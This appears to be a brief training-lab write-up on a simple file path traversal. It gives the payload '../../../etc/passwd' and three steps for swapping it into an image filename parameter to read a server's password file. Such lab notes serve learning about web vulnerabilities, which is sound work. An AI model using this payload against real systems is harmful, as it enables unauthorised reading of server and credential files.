# Lab 01

## Lab: File path traversal, simple case

**Vulnerable Path** ../../../etc/passwd

**Step-by-step:**
1. Intercept product
2. FORWARD until get vulnerable parameter (/image?filename=74.jpg)
3. Replace 74.jpg with ../../../etc/passwd

![beb8d45475824e57a5d82b2f46809b0c](https://user-images.githubusercontent.com/44063862/106375399-9fc38f00-63c6-11eb-9085-ec8c4e8d93b4.png)
